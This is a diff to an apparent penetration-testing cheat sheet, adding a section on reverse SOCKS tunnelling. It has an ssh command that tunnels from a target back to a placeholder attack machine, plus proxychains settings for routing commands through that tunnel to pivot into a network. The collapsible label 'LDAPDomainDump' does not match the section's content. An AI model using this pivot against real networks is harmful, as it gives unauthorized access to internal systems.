@@ -362,6 +362,30 @@ How to pentest like a Gunnaj
 
 </details> 
 
+# Proxychains
+
+<details>
+  <summary> LDAPDomainDump </summary> 
+
+  ### Reverse SOCKS tunnel
+  ```shell
+  ssh -N -D 127.0.0.1:1080 -R <PORT>:127.0.0.1:1080 <ssh_user>@<ATTACK_MACHINE_IP>
+  ```
+
+  ### Edit /etc/proxychains
+  ```shell
+  [ProxyList]
+  socks5 127.0.0.1 <PORT>
+  ```
+
+  ### Sending command via the tunnel
+  ```shell
+  proxychains <command>
+  ```
+
+</details> 
+
+
 # Acitve directory enumeration
 
 <details>
